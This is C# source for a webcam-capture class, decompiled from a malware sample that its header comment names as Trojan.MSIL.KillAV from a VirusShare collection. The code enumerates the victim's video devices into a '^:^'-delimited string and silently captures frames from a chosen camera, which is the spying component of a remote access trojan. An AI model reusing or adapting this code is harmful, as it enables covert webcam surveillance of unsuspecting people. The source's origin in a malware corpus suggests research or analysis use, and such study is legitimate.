// Decompiled with JetBrains decompiler
// Type: n.Cam
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.KillAV.ao-c83dfee0b35be414b2ecb0a3b5fff41c790bb356c2774a2fc681a8981978b48b.exe

using DirectX.Capture;
using Microsoft.VisualBasic;
using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace n
{
  public class Cam
  {
    private ComboBox Divs;
    private ComboBox Comp;
    private ListBox lboxDriver;
    private Cam.Active CaptureInformation;
    private Filters Dispositivos;
    private PictureBox p;

    public Cam()
    {
      this.Divs = new ComboBox();
      this.Comp = new ComboBox();
      this.lboxDriver = new ListBox();
      this.Dispositivos = new Filters();
    }

    public void dispose()
    {
      this.CaptureInformation.CaptureInfo.DisposeCapture();
      this.CaptureInformation.CaptureInfo.Dispose();
    }

    public Image cap(ref int i)
    {
      this.CaptureInformation.Camera = this.Dispositivos.VideoInputDevices[i];
      this.CaptureInformation.CaptureInfo = new DirectX.Capture.Capture(this.CaptureInformation.Camera, (DirectX.Capture.Filter) null);
      this.CaptureInformation.CaptureInfo.FrameCaptureComplete += new DirectX.Capture.Capture.FrameCapHandler(this.RefreshImage);
      this.CaptureInformation.Counter = 1;
      this.CaptureInformation.CounterFrames = 1;
      this.CaptureInformation.CaptureInfo.Stop();
      this.CaptureInformation.CaptureInfo.VideoCompressor = this.Dispositivos.VideoCompressors[0];
      string[] strArray = "160x120".Split('x');
      this.CaptureInformation.CaptureInfo.FrameSize = new Size(checked ((int) Math.Round(Conversion.Val(strArray[0]))), checked ((int) Math.Round(Conversion.Val(strArray[1]))));
      this.CaptureInformation.CaptureInfo.FrameRate = Conversion.Val((object) 5);
      this.CaptureInformation.CaptureInfo.PreviewWindow = (Control) new Panel();
      this.CaptureInformation.CaptureInfo.CaptureFrame();
      int num;
      do
      {
        Thread.Sleep(1);
        Application.DoEvents();
        if (this.p != null)
        {
          Image image = (Image) this.p.Image.Clone();
          this.p.Dispose();
          return image;
        }
        checked { ++num; }
      }
      while (num != 5000);
      return (Image) null;
    }

    public void RefreshImage(PictureBox Frame) => this.p = Frame;

    public string Dnames()
    {
      this.Divs.Items.Clear();
      short num1 = checked ((short) (this.Dispositivos.VideoInputDevices.Count - 1));
      short index1 = 0;
      while ((int) index1 <= (int) num1)
      {
        this.Divs.Items.Add((object) this.Dispositivos.VideoInputDevices[(int) index1].Name);
        checked { ++index1; }
      }
      int num2 = checked (this.Divs.Items.Count - 1);
      int index2 = 0;
      string str;
      while (index2 <= num2)
      {
        str += this.Divs.Items[index2].ToString();
        if (index2 != checked (this.Divs.Items.Count - 1))
          str += "^:^";
        checked { ++index2; }
      }
      return str;
    }

    public struct Active
    {
      public DirectX.Capture.Filter Camera;
      public DirectX.Capture.Capture CaptureInfo;
      public int Counter;
      public int CounterFrames;
      public string PathVideo;
    }
  }
}
